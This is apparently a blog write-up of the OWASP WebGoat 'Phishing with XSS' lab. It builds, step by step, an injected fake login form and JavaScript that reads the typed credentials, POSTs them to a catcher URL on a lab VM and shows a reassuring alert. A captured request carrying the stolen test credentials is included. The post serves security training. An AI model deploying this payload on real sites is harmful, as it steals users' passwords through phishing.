---
layout: post
title:  "OWASP BWA WebGoat Challenge: Cross Site Scripting"
subtitle: "Phishing with XSS"
date:   2017-01-26 00:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-header.jpg"
---
# Cross Site Scripting: Phishing with XSS
Instructions:

Below is an example of a standard search feature.
Using XSS and HTML insertion, your goal is to:

- Insert html to that requests credentials
- Add javascript to actually collect the credentials
- Post the credentials to http://localhost/webgoat/catcher?PROPERTY=yes...
- To pass this lesson, the credentials must be posted to the catcher servlet.

Nice, some more XSS. I'm actually really enjoying the XSS challenges. They seem to require a bit more craftiness than some of the other challenges, and this one looks like no exception. Login spoofing, credential grabbing, and sneaky javascript? Cool!

First off, let's try a test search and see what our attack vector looks like:

<img src="{{ site.baseurl }}/images/2017-01-25-webgoat_part_8/test-search.jpg">

Alright. So I don't see any clientside code that puts our search result on the page. I verified that by watching the request to the server and seeing it respond with the full HTML for the results page. So we're going to have to do some blackbox testing to see what we can get by any server side XSS filtering.

*Note*: I also found the full URL format for the credential catcher servlet in the server response:
```
http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
```

So, if we look at the instructions, there are three separate steps in this injection:

- insertion of a fake login form
- insertion of a javascript function that will steal the creds from our inserted login form
- mechanism to send stolen creds to the servlet

Let's start with a little bit of test code. We only have one insertion point, so we have to put everything in at once. Let's try to pass a script and a login prompt to our user:

```
<script>
function testFunction() {
	return "test"
}
</script>
<br>
<input id="user" value="username" type="TEXT"><br>
<input id="password" value="pass" type="TEXT"><br>{
<button type="button" onclick='javascript:alert(testFunction()")'>Login</button>
```

<img src="{{ site.baseurl }}/images/2017-01-25-webgoat_part_8/test-pop.jpg">

Nice! We can call arbitrary javascript code we write on button press. Now let's try to harness that to grab some user data. To complete this I had to do some research about how Document Object Models and Javascript interact. On load, a browser creates a DOM of the page that is structured something like this (Credit to [W3 Schools][dom-js]):

<img src="{{ site.baseurl }}/images/2017-01-25-webgoat_part_8/dom-model.gif">

Notice how everything on the page is an element. Well we can use a javascript builtin function called ```getElementById( id )``` on the ```document``` to access any element on the page (that we specify by its unique id). We can achieve this by creating variables in our injected script to access injected elements in our document. Let's try to set the ```id``` field of our username and password inputs to a value we like, and access them with our injected javascript:

```
<script>
function userCreds() {
	var username = document.getElementById("user").value;
	var password = document.getElementById("pass").value;

	return username + ":" + password
}
</script>
<br>
<input id="user" value="username" type="TEXT"><br>
<input id="pass" value="password" type="TEXT"><br>
<button type="button" onclick='javascript:alert(`user:pass= ` + userCreds())'>Login</button>
```

<img src="{{ site.baseurl }}/images/2017-01-25-webgoat_part_8/user-pop.jpg">

Alright! So we successfully accessed the user data that we want. Now we need to send it to the servlet behind the scenes. Let's break out a friend we've seen before, ```XMLHttpRequest```, and steal some creds!

```
<script>
function stealCreds() {
	var username = document.getElementById("user").value;
	var password = document.getElementById("pass").value;

	var credURL = "http://192.168.56.101/WebGoat/catcher?PROPERTY=yes&user="+username+"&password="+password;

	var xmlHTTP = new XMLHttpRequest();
	xmlHTTP.open("POST",credURL, false);
	xmlHTTP.send(null);

	return "You were successfully logged in!";
}
</script>
<br>
<input id="user" value="username" type="TEXT"><br>
<input id="pass" value="password" type="TEXT"><br>
<button type="button" onclick='javascript:alert(stealCreds())''>Login</button>
```

Now we have a much more nefarious implementation of our script. First, it parses the data from the login fields and properly formats it into our waiting servlet url. Then we create a new ```XMLHttpRequest```, which we use to ```POST``` our stolen credentials to our servlet URL. Finally, we return the 'all clear' alert to our user so that no one is the wiser (and no one changes their password!). Let's see it in action:

```
POST /WebGoat/catcher?PROPERTY=yes&user=regularguy&password=password123 HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.56.101/WebGoat/attack?Screen=54&menu=900
Cookie: JSESSIONID=27BE2D33035F93B37F3998509C6AD48C; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
Authorization: Basic dXNlcjp1c2Vy
Connection: close
Content-Length: 0
```

<img src="{{ site.baseurl }}/images/2017-01-25-webgoat_part_8/user-logged.jpg">

XSS'd! That was more challenging that a lot of the other problems so far, but also a lot of fun!

### References

1 [DOM Javascript][dom-js]

2 [DOM Value Accession][dom-accession]

3 [Javascript HTTP Requests][js-requests]

[dom-js]:http://www.w3schools.com/js/js_htmldom.asp
[dom-accession]:http://www.w3schools.com/js/js_htmldom_methods.asp
[js-requests]:http://stackoverflow.com/questions/247483/http-get-request-in-javascript
